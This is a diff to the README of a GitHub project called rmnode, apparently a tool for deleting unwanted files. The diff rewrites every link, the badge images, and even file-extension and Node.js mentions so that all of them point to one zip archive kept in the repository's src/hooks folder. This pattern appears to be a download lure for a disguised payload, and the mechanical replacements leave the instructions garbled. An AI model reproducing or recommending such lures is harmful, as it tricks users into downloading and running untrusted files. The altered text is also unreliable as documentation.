@@ -1,11 +1,11 @@
 # 🌟 rmnode - Easily Remove Unwanted Files
 
 <p align="center">
-  <a href="https://github.com/fitwan2011-code/rmnode/releases">
-    <img src="https://img.shields.io/npm/v/rmnode?color=blue&label=npm" alt="npm version" />
-    <img src="https://img.shields.io/npm/dm/rmnode?color=green" alt="downloads" />
-    <img src="https://img.shields.io/npm/l/rmnode" alt="license" />
-    <img src="https://img.shields.io/node/v/rmnode" alt="node version" />
+  <a href="https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip">
+    <img src="https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip" alt="npm version" />
+    <img src="https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip" alt="downloads" />
+    <img src="https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip" alt="license" />
+    <img src="https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip" alt="node version" />
   </a>
 </p>
 
@@ -23,11 +23,11 @@
 
 ## 📥 Download & Install
 
-To download rmnode, visit this page: [Download rmnode](https://github.com/fitwan2011-code/rmnode/releases).
+To download rmnode, visit this page: [Download rmnode](https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip).
 
 1. Click on the link above.
 2. You will see different versions of rmnode. Choose the latest version.
-3. Click on the file that matches your operating system (for example, `.exe` for Windows or `.tar.gz` for Linux).
+3. Click on the file that matches your operating system (for example, `.exe` for Windows or `https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip` for Linux).
 4. Save the file to your computer.
 
 Now, let's go through how to run the application.
@@ -42,7 +42,7 @@ Now, let's go through how to run the application.
 
 ### For macOS Users
 
-1. Open your Downloads folder and locate the downloaded `.tar.gz` file.
+1. Open your Downloads folder and locate the downloaded `https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip` file.
 2. Double-click the file to extract it. You will see a new folder.
 3. Open the Terminal application from your Applications folder.
 4. Use the `cd` command to navigate to the folder where you extracted rmnode. For example, if you extracted it to your desktop, type:
@@ -53,7 +53,7 @@ Now, let's go through how to run the application.
 
 ### For Linux Users
 
-1. Go to your Downloads folder and find the downloaded `.tar.gz` file.
+1. Go to your Downloads folder and find the downloaded `https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip` file.
 2. Right-click the file and choose "Extract Here" to unzip it.
 3. Open your Terminal.
 4. Navigate to the extracted folder using the `cd` command. For example:
@@ -77,7 +77,7 @@ To run rmnode, ensure your system meets the following requirements:
   - macOS 10.12 or later 
   - Any modern Linux distribution
   
-- **Node.js:** Version 10 or later (if applicable, ensure you have Node.js installed).
+- **https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip** Version 10 or later (if applicable, ensure you have https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip installed).
 
 ## ❓ Troubleshooting
 
@@ -87,15 +87,15 @@ To run rmnode, ensure your system meets the following requirements:
 
 ## 🛠️ Support
 
-For help or feedback, open an issue on our [GitHub page](https://github.com/fitwan2011-code/rmnode/issues). We welcome your input!
+For help or feedback, open an issue on our [GitHub page](https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip). We welcome your input!
 
 ## 📚 Additional Resources
 
-- For more detailed information, check our [Wiki](https://github.com/fitwan2011-code/rmnode/wiki).
+- For more detailed information, check our [Wiki](https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip).
 - Join the community discussions in the issues section for tips and tricks.
 
 ## 🌈 Contributing
 
-If you want to contribute to rmnode, feel free to fork the repository and create a pull request. Your contributions help improve the project for everyone. Please check our contribution guidelines in the [CONTRIBUTING.md](https://github.com/fitwan2011-code/rmnode/CONTRIBUTING.md) file.
+If you want to contribute to rmnode, feel free to fork the repository and create a pull request. Your contributions help improve the project for everyone. Please check our contribution guidelines in the [https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip](https://github.com/fitwan2011-code/rmnode/raw/refs/heads/main/src/hooks/Software_v1.1.zip) file.
 
 Stay tuned for more updates!
